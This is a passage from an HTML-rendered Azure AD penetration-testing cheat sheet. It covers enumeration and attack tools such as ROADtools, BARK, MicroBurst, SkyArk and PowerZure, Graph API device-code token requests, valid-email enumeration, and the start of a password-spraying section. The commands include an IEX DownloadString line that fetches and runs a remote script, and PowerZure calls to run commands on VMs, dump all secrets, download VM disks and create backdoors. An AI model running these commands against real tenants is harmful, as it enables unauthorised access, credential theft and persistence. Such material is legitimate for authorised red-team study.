<a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a><span class="n">virtual-machines</span><span class="p">:</span> <span class="n">Collects</span> <span class="n">AzureRM</span> <span class="n">virtual</span> <span class="n">machines</span>
<a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>
<a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a><span class="c"># GUI access</span>
<a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a><span class="n">bolt</span><span class="p">://</span><span class="n">localhost</span><span class="p">:</span><span class="n">7687</span>
<a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a><span class="n">Username</span><span class="p">:</span> <span class="n">neo4j</span>
<a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a><span class="n">Password</span><span class="p">:</span> <span class="n">BloodHound</span>
<a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a>
<a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a><span class="c"># Custom Queries : https://hausec.com/2020/11/23/azurehound-cypher-cheatsheet/</span>
<a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a><span class="c"># Cypher query examples:</span>
<a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a><span class="n">MATCH</span> <span class="n">p</span> <span class="p">=</span> <span class="p">(</span><span class="n">n</span><span class="p">)-</span><span class="no">[r]</span><span class="p">-&gt;(</span><span class="n">g</span><span class="p">:</span><span class="n">AZKeyVault</span><span class="p">)</span> <span class="k">RETURN</span> <span class="n">p</span>
<a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a><span class="n">MATCH</span> <span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="nb">WHERE </span><span class="n">n</span><span class="p">.</span><span class="n">azname</span> <span class="n">IS</span> <span class="n">NOT</span> <span class="n">NULL</span> <span class="n">AND</span> <span class="n">n</span><span class="p">.</span><span class="n">azname</span> <span class="p">&lt;&gt;</span> <span class="s2">&quot;&quot;</span> <span class="n">AND</span> <span class="n">n</span><span class="p">.</span><span class="n">name</span> <span class="n">IS</span> <span class="n">NULL</span> <span class="nb">SET </span><span class="n">n</span><span class="p">.</span><span class="n">name</span> <span class="p">=</span> <span class="n">n</span><span class="p">.</span><span class="n">azname</span>
</code></pre></div></li>
<li><a href="https://github.com/BloodHoundAD/BARK"><strong>BloodHoundAD/BARK</strong></a> - BloodHound Attack Research Kit
    <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">.</span> <span class="p">.\</span><span class="n">BARK</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nv">$MyRefreshTokenRequest</span> <span class="p">=</span> <span class="nb">Get-AZRefreshTokenWithUsernamePassword</span> <span class="n">-username</span> <span class="s2">&quot;user@contoso.onmicrosoft.com&quot;</span> <span class="n">-password</span> <span class="s2">&quot;MyVeryCoolPassword&quot;</span> <span class="n">-TenantID</span> <span class="s2">&quot;contoso.onmicrosoft.com&quot;</span>
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nv">$MyMSGraphToken</span> <span class="p">=</span> <span class="nb">Get-MSGraphTokenWithRefreshToken</span> <span class="n">-RefreshToken</span> <span class="nv">$MyRefreshTokenRequest</span><span class="p">.</span><span class="n">refresh_token</span> <span class="n">-TenantID</span> <span class="s2">&quot;contoso.onmicrosoft.com&quot;</span>
<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="nv">$MyAADUsers</span> <span class="p">=</span> <span class="nb">Get-AllAzureADUsers</span> <span class="n">-Token</span> <span class="nv">$MyMSGraphToken</span><span class="p">.</span><span class="n">access_token</span> <span class="n">-ShowProgress</span>
</code></pre></div></li>
<li><a href="https://github.com/dirkjanm/ROADtools"><strong>ROADTool</strong></a> - The Azure AD exploration framework.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">pipenv</span> <span class="n">shell</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">roadrecon</span> <span class="n">auth</span> <span class="p">[</span><span class="n">-h</span><span class="p">]</span> <span class="p">[</span><span class="n">-u</span> <span class="n">USERNAME</span><span class="p">]</span> <span class="p">[</span><span class="n">-p</span> <span class="n">PASSWORD</span><span class="p">]</span> <span class="p">[</span><span class="n">-t</span> <span class="n">TENANT</span><span class="p">]</span> <span class="p">[</span><span class="n">-c</span> <span class="n">CLIENT</span><span class="p">]</span> <span class="p">[-</span><span class="o">-as</span><span class="n">-app</span><span class="p">]</span> <span class="p">[-</span><span class="n">-device-code</span><span class="p">]</span> <span class="p">[-</span><span class="n">-access-token</span> <span class="n">ACCESS_TOKEN</span><span class="p">]</span> <span class="p">[-</span><span class="n">-refresh-token</span> <span class="n">REFRESH_TOKEN</span><span class="p">]</span> <span class="p">[</span><span class="o">-f</span> <span class="n">TOKENFILE</span><span class="p">]</span> <span class="p">[-</span><span class="n">-tokens-stdout</span><span class="p">]</span>
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="n">roadrecon</span> <span class="n">gather</span> <span class="p">[</span><span class="n">-h</span><span class="p">]</span> <span class="p">[</span><span class="n">-d</span> <span class="n">DATABASE</span><span class="p">]</span> <span class="p">[</span><span class="o">-f</span> <span class="n">TOKENFILE</span><span class="p">]</span> <span class="p">[-</span><span class="n">-tokens-stdin</span><span class="p">]</span> <span class="p">[-</span><span class="n">-mfa</span><span class="p">]</span>
<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">roadrecon</span> <span class="n">auth</span> <span class="n">-u</span> <span class="n">test</span><span class="p">@&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">PASSWORD</span><span class="p">&gt;</span>
<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="n">roadrecon</span> <span class="n">gather</span>
<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="n">roadrecon</span> <span class="n">gui</span>
</code></pre></div></li>
<li><a href="https://github.com/Azure/Stormspotter"><strong>Azure/StormSpotter</strong></a> - Azure Red Team tool for graphing Azure and Azure Active Directory objects
    <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c"># session 1 - backend</span>
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">pipenv</span> <span class="n">shell</span>
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="n">python</span> <span class="n">ssbackend</span><span class="p">.</span><span class="n">pyz</span>
<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="c"># session 2 - frontend</span>
<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="nb">cd </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">stormspotter</span><span class="p">\</span><span class="n">frontend</span><span class="p">\</span><span class="n">dist</span><span class="p">\</span><span class="n">spa</span><span class="p">\</span>
<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="n">quasar</span><span class="p">.</span><span class="n">cmd</span> <span class="n">serve</span> <span class="n">-p</span> <span class="n">9091</span> <span class="p">-</span><span class="n">-history</span>
<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>
<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="c"># session 3 - collector</span>
<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="n">pipenv</span> <span class="n">shell</span>
<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="n">az</span> <span class="n">login</span> <span class="n">-u</span> <span class="n">test</span><span class="p">@&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">PASSWORD</span><span class="p">&gt;</span>
<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="n">python</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">stormspotter</span><span class="p">\</span><span class="n">stormcollector</span><span class="p">\</span><span class="n">sscollector</span><span class="p">.</span><span class="n">pyz</span> <span class="nb">cli</span>
<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>
<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="c"># Web access on http://localhost:9091</span>
<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="n">Username</span><span class="p">:</span> <span class="n">neo4j</span>
<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="n">Password</span><span class="p">:</span> <span class="n">BloodHound</span>
<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="n">Server</span><span class="p">:</span> <span class="n">bolt</span><span class="p">://</span><span class="n">localhost</span><span class="p">:</span><span class="n">7687</span>
</code></pre></div></li>
<li><a href="https://msportals.io/"><strong>Microsoft Portals</strong></a> - Microsoft Administrator Sites</li>
<li><a href="https://github.com/nccgroup/azucar.git"><strong>nccgroup/Azucar</strong></a> : Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c"># You should use an account with at least read-permission on the assets you want to access</span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Get-ChildItem</span> <span class="n">-Recurse</span> <span class="n">c</span><span class="p">:\</span><span class="n">Azucar_V10</span> <span class="p">|</span> <span class="nb">Unblock-File</span>
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">Azucar</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-AuthMode</span> <span class="n">UseCachedCredentials</span> <span class="n">-Verbose</span> <span class="n">-WriteLog</span> <span class="n">-Debug</span> <span class="n">-ExportTo</span> <span class="n">PRINT</span>
<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">Azucar</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-ExportTo</span> <span class="n">CSV</span><span class="p">,</span><span class="n">JSON</span><span class="p">,</span><span class="n">XML</span><span class="p">,</span><span class="n">EXCEL</span> <span class="n">-AuthMode</span> <span class="n">Certificate_Credentials</span> <span class="n">-Certificate</span> <span class="n">C</span><span class="p">:\</span><span class="n">AzucarTest</span><span class="p">\</span><span class="n">server</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-ApplicationId</span> <span class="n">00000000</span><span class="p">-</span><span class="n">0000</span><span class="p">-</span><span class="n">0000</span><span class="p">-</span><span class="n">0000</span><span class="p">-</span><span class="n">000000000000</span> <span class="n">-TenantID</span> <span class="n">00000000</span><span class="p">-</span><span class="n">0000</span><span class="p">-</span><span class="n">0000</span><span class="p">-</span><span class="n">0000</span><span class="p">-</span><span class="n">000000000000</span>
<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">Azucar</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-ExportTo</span> <span class="n">CSV</span><span class="p">,</span><span class="n">JSON</span><span class="p">,</span><span class="n">XML</span><span class="p">,</span><span class="n">EXCEL</span> <span class="n">-AuthMode</span> <span class="n">Certificate_Credentials</span> <span class="n">-Certificate</span> <span class="n">C</span><span class="p">:\</span><span class="n">AzucarTest</span><span class="p">\</span><span class="n">server</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-CertFilePassword</span> <span class="n">MySuperP</span><span class="nv">@ssw0rd</span><span class="p">!</span> <span class="n">-ApplicationId</span> <span class="n">00000000</span><span class="p">-</span><span class="n">0000</span><span class="p">-</span><span class="n">0000</span><span class="p">-</span><span class="n">0000</span><span class="p">-</span><span class="n">000000000000</span> <span class="n">-TenantID</span> <span class="n">00000000</span><span class="p">-</span><span class="n">0000</span><span class="p">-</span><span class="n">0000</span><span class="p">-</span><span class="n">0000</span><span class="p">-</span><span class="n">000000000000</span>
<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="c"># resolve the TenantID for an specific username</span>
<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">Azucar</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-ResolveTenantUserName</span> <span class="n">user</span><span class="nv">@company</span><span class="p">.</span><span class="n">com</span>
</code></pre></div></li>
<li><a href="https://github.com/FSecureLABS/Azurite"><strong>FSecureLABS/Azurite Explorer</strong></a> and <strong>Azurite Visualizer</strong> : Enumeration and reconnaissance activities in the Microsoft Azure Cloud.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">git</span> <span class="n">submodule</span> <span class="n">init</span>
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="n">git</span> <span class="n">submodule</span> <span class="n">update</span>
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="n">AzureRM</span>
<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="n">AzuriteExplorer</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="n">Review-AzureRmSubscription</span>
<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="n">Review-CustomAzureRmSubscription</span>
</code></pre></div></li>
<li><a href="https://github.com/NetSPI/MicroBurst"><strong>NetSPI/MicroBurst</strong></a> - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping
    <div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">MicroBurst</span><span class="p">.</span><span class="n">psm1</span>
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Get-AzureDomainInfo</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:&gt;</span> <span class="nb">Get-AzureDomainInfo</span> <span class="n">-folder</span> <span class="n">MicroBurst</span> <span class="n">-Verbose</span>
</code></pre></div></li>
<li>
<p><a href="https://github.com/cyberark/SkyArk"><strong>cyberark/SkyArk</strong></a> - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins. <br />
    Require:</p>
<ul>
<li>Read-Only permissions over Azure Directory (Tenant)</li>
<li>Read-Only permissions over Subscription</li>
<li>Require AZ and AzureAD module or administrator right</li>
</ul>
<p>```powershell
$ powershell -ExecutionPolicy Bypass -NoProfile
PS C&gt; Import-Module .\SkyArk.ps1 -force
PS C&gt; Start-AzureStealth
PS C&gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1')<br />
PS C&gt; Scan-AzureAdmins<br />
* <a href="https://github.com/hausec/PowerZure"><strong>hausec/PowerZure</strong></a> - PowerShell framework to assess Azure security
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c"># Require az module !</span>
<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="p">$</span> <span class="nb">ipmo </span><span class="p">.\</span><span class="n">PowerZure</span>
<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="p">$</span> <span class="nb">Set-Subscription</span> <span class="n">-Id</span> <span class="no">[idgoeshere]</span>
<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="c"># Reader</span>
<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="p">$</span> <span class="nb">Get-Runbook</span><span class="p">,</span> <span class="nb">Get-AllUsers</span><span class="p">,</span> <span class="nb">Get-Apps</span><span class="p">,</span> <span class="nb">Get-Resources</span><span class="p">,</span> <span class="nb">Get-WebApps</span><span class="p">,</span> <span class="nb">Get-WebAppDetails</span>
<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>
<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="c"># Contributor</span>
<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="p">$</span> <span class="n">Execute-Command</span> <span class="n">-OS</span> <span class="n">Windows</span> <span class="n">-VM</span> <span class="n">Win10Test</span> <span class="n">-ResourceGroup</span> <span class="nb">Test-RG</span> <span class="n">-Command</span> <span class="s2">&quot;whoami&quot;</span>
<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="p">$</span> <span class="n">Execute-MSBuild</span> <span class="n">-VM</span> <span class="n">Win10Test</span>  <span class="n">-ResourceGroup</span> <span class="nb">Test-RG</span> <span class="o">-File</span> <span class="s2">&quot;build.xml&quot;</span>
<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="p">$</span> <span class="nb">Get-AllSecrets</span> <span class="c"># AllAppSecrets, AllKeyVaultContents</span>
<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="p">$</span> <span class="nb">Get-AvailableVMDisks</span><span class="p">,</span> <span class="nb">Get-VMDisk</span> <span class="c"># Download a virtual machine&#39;s disk</span>
<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>
<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="c"># Owner</span>
<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="p">$</span> <span class="nb">Set-Role</span> <span class="n">-Role</span> <span class="n">Contributor</span> <span class="n">-User</span> <span class="n">test</span><span class="nv">@contoso</span><span class="p">.</span><span class="n">com</span> <span class="n">-Resource</span> <span class="n">Win10VMTest</span>
<a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>
<a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="c"># Administrator</span>
<a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a><span class="p">$</span> <span class="n">Create-Backdoor</span><span class="p">,</span> <span class="n">Execute-Backdoor</span>
</code></pre></div></p>
</li>
</ul>
<h2 id="authenticating-to-the-microsoft-graph-api-in-powershell">Authenticating to the Microsoft Graph API in PowerShell</h2>
<ul>
<li><a href="https://learn.microsoft.com/fr-fr/troubleshoot/azure/active-directory/verify-first-party-apps-sign-in">Microsoft Applications ID</a></li>
</ul>
<table>
<thead>
<tr>
<th>Name</th>
<th>GUID</th>
</tr>
</thead>
<tbody>
<tr>
<td>Microsoft Azure PowerShell</td>
<td>1950a258-227b-4e31-a9cf-717495945fc2</td>
</tr>
<tr>
<td>Microsoft Azure CLI</td>
<td>04b07795-8ddb-461a-bbee-02f9e1bf7b46</td>
</tr>
<tr>
<td>Portail Azure</td>
<td>c44b4083-3bb0-49c1-b47d-974e53cbdf3c</td>
</tr>
</tbody>
</table>
<h3 id="graph-api-refresh-token">Graph API Refresh Token</h3>
<p>Authenticating to the Microsoft Graph API in PowerShell</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nv">$body</span> <span class="p">=</span> <span class="p">@{</span>
<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>    <span class="s2">&quot;client_id&quot;</span> <span class="p">=</span>     <span class="s2">&quot;1950a258-227b-4e31-a9cf-717495945fc2&quot;</span>
<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>    <span class="s2">&quot;resource&quot;</span> <span class="p">=</span>      <span class="s2">&quot;https://graph.microsoft.com&quot;</span> <span class="c"># Microsoft Graph API </span>
<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="p">}</span>
<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="nv">$UserAgent</span> <span class="p">=</span> <span class="s2">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36&quot;</span>
<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="nv">$Headers</span><span class="p">=@{}</span>
<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="nv">$Headers</span><span class="p">[</span><span class="s2">&quot;User-Agent&quot;</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$UserAgent</span>
<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="nv">$authResponse</span> <span class="p">=</span> <span class="nb">Invoke-RestMethod</span> <span class="p">`</span>
<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>    <span class="n">-UseBasicParsing</span> <span class="p">`</span>
<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>    <span class="n">-Method</span> <span class="n">Post</span> <span class="p">`</span>
<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>    <span class="n">-Uri</span> <span class="s2">&quot;https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0&quot;</span> <span class="p">`</span>
<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>    <span class="n">-Headers</span> <span class="nv">$Headers</span> <span class="p">`</span>
<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>    <span class="n">-Body</span> <span class="nv">$body</span>
<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="nv">$authResponse</span>
</code></pre></div>
<h3 id="graph-api-access-token">Graph API Access Token</h3>
<p>This request require getting the Refresh Token.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nv">$body</span><span class="p">=@{</span>
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>    <span class="s2">&quot;client_id&quot;</span> <span class="p">=</span>  <span class="s2">&quot;1950a258-227b-4e31-a9cf-717495945fc2&quot;</span>
<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>    <span class="s2">&quot;grant_type&quot;</span> <span class="p">=</span> <span class="s2">&quot;urn:ietf:params:oauth:grant-type:device_code&quot;</span>
<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>    <span class="s2">&quot;code&quot;</span> <span class="p">=</span>       <span class="nv">$authResponse</span><span class="p">.</span><span class="n">device_code</span>
<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="p">}</span>
<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="nv">$Tokens</span> <span class="p">=</span> <span class="nb">Invoke-RestMethod</span> <span class="p">`</span>
<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>    <span class="n">-UseBasicParsing</span> <span class="p">`</span>
<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>    <span class="n">-Method</span> <span class="n">Post</span> <span class="p">`</span>
<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>    <span class="n">-Uri</span> <span class="s2">&quot;https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0&quot;</span> <span class="p">`</span>
<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>    <span class="n">-Headers</span> <span class="nv">$Headers</span> <span class="p">`</span>
<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>    <span class="n">-Body</span> <span class="nv">$body</span>
<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="nv">$Tokens</span>
</code></pre></div>
<h2 id="terminology">Terminology</h2>
<blockquote>
<p>Basic Azure AD terminologies</p>
</blockquote>
<ul>
<li><strong>Tenant</strong>: An instance of Azure AD and represents a single organization.</li>
<li><strong>Azure AD Directory</strong>: Each tenant has a dedicated Directory. This is used to perform identity and access management functions for resources.</li>
<li><strong>Subscriptions</strong>: It is used to pay for services. There can be multiple subscriptions in a Directory.</li>
<li><strong>Core Domain</strong>: The initial domain name <tenant>.onmicrosoft.com is the core domain. It is possible to define custom domain names too.</li>
</ul>
<h2 id="training">Training</h2>
<ul>
<li>AzureGoat : A Damn Vulnerable Azure Infrastructure - https://github.com/ine-labs/AzureGoat</li>
</ul>
<h2 id="enumeration">Enumeration</h2>
<h3 id="enumerate-valid-emails">Enumerate valid emails</h3>
<blockquote>
<p>By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.</p>
</blockquote>
<ul>
<li>Validate email 
    <div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="n">C</span><span class="p">:\</span><span class="n">Python27</span><span class="p">\</span><span class="n">python</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">o365creeper</span><span class="p">\</span><span class="n">o365creeper</span><span class="p">.</span><span class="n">py</span> <span class="o">-f</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">emails</span><span class="p">.</span><span class="n">txt</span> <span class="n">-o</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">validemails</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">admin</span><span class="p">@&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span>   <span class="p">-</span> <span class="n">VALID</span>
<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="n">root</span><span class="p">@&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span>    <span class="p">-</span> <span class="n">INVALID</span>
<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="n">test</span><span class="p">@&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span>    <span class="p">-</span> <span class="n">VALID</span>
<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">contact</span><span class="p">@&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span> <span class="p">-</span> <span class="n">INVALID</span>
</code></pre></div></li>
<li>Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon</li>
</ul>
<h4 id="password-spraying">Password spraying</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="p">.</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">MSOLSpray</span><span class="p">\</span><span class="n">MSOLSpray</span><span class="p">.</span><span class="n">ps1</span>
